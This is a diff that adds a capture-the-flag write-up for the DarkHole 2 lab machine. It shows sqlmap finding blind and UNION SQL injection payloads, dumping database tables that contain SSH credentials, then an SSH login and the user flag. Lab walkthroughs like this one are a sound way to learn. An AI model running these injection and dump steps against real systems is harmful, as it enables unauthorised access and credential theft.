@@ -98,3 +98,129 @@ index 8a0ff67..0904b19 100644
 
 ````
 Now the content is in /website 
+
+### sql inject
+
+the login information works and shows edit fields, so maybe sql injection could work.
+open the page in burp and save the request with cookie to a file and let `sqlmap` find a vulnerability:
+
+```bash
+$ sqlmap -r request.txt --dbs --batch       
+        ___
+       __H__                                                                                                       
+ ___ ___[)]_____ ___ ___  {1.6.4#stable}                                                                           
+|_ -| . [.]     | .'| . |                                                                                          
+|___|_  [']_|_|_|__,|  _|                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:40:59 /2022-06-15/
+
+[12:40:59] [INFO] parsing HTTP request from 'request.txt'
+[12:40:59] [INFO] resuming back-end DBMS 'mysql' 
+[12:40:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
+---
+[12:40:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[12:40:59] [INFO] fetching database names
+available databases [5]:
+[*] darkhole_2
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+
+[12:40:59] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'
+
+[*] ending @ 12:40:59 /2022-06-15/
+
+$ sqlmap -r request.txt -D darkhole_2 --dump-all --batch 
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.4#stable}                                                                           
+|_ -| . ["]     | .'| . |                                                                                          
+|___|_  [.]_|_|_|__,|  _|                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:41:31 /2022-06-15/
+
+[12:41:31] [INFO] parsing HTTP request from 'request.txt'
+[12:41:31] [INFO] resuming back-end DBMS 'mysql' 
+[12:41:31] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 7829 FROM (SELECT(SLEEP(5)))FOXp) AND 'AndS'='AndS
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=-2051' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717871,0x7a5751754e596265786e54434d724b50496467705467475a656f41726a694e7a7a45724d6a674661,0x716a6b7a71),NULL,NULL,NULL-- -
+---
+[12:41:31] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: MySQL >= 5.0.12
+[12:41:31] [INFO] fetching tables for database: 'darkhole_2'
+[12:41:31] [INFO] fetching columns for table 'users' in database 'darkhole_2'
+[12:41:31] [INFO] fetching entries for table 'users' in database 'darkhole_2'
+Database: darkhole_2
+Table: users
+[1 entry]
++----+----------------+-------------------------------------------+----------+-----------------+----------------+
+| id | email          | address                                   | password | username        | contact_number |
++----+----------------+-------------------------------------------+----------+-----------------+----------------+
+| 1  | lush@admin.com |  Street, Pincode, Province/State, Country | 321      | Ayuda por favor | 33             |
++----+----------------+-------------------------------------------+----------+-----------------+----------------+
+
+[12:41:31] [INFO] table 'darkhole_2.users' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/users.csv'                                                                                       
+[12:41:31] [INFO] fetching columns for table 'ssh' in database 'darkhole_2'
+[12:41:31] [INFO] fetching entries for table 'ssh' in database 'darkhole_2'
+Database: darkhole_2
+Table: ssh
+[1 entry]
++----+------+--------+
+| id | pass | user   |
++----+------+--------+
+| 1  | fool | jehad  |
++----+------+--------+
+
+[12:41:31] [INFO] table 'darkhole_2.ssh' dumped to CSV file '/home/pascal/.local/share/sqlmap/output/192.168.10.17/dump/darkhole_2/ssh.csv'                                                                                           
+[12:41:31] [INFO] fetched data logged to text files under '/home/pascal/.local/share/sqlmap/output/192.168.10.17'
+
+[*] ending @ 12:41:31 /2022-06-15/
+```
+
+the ssh auth is `jehad:fool`
+
+## ssh
+
+connect `ssh jehad@$IP`
+
+```bash
+jehad@darkhole:/home$ find . -type f -name 'user.txt' 2>/dev/null
+./losy/user.txt
+
+jehad@darkhole:/home$ cat losy/user.txt 
+cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}
+```
+
+
+## Flags
+User: `cyberctfd{ejkedSmQx5zEBJz9PjE8gTbPkHr839EY}`
